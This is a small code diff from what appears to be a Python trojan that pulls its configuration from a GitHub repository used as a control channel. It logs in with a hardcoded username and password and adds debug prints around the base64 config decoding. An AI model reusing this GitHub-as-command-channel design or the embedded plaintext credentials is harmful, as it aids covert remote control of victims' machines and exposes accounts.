@@ -20,6 +20,7 @@ task_queue = queue.Queue()
 configured = False
 
 
+
 def connect_to_github():
     gh = login(username="canyoe", password="mcgithub5")
     repo = gh.repository("canyoe", "test_repo")
@@ -49,9 +50,10 @@ def get_trojan_config():
     config_json = get_file_contents(trojan_config)
     print(type(config_json))
     decoded_json = base64.b64decode(config_json)
-
+    print(type(decoded_json))
     decoded_json = str(decoded_json)
     print(type(decoded_json))
+    print(decoded_json)
     config = json.loads(decoded_json)
     configured = True
 
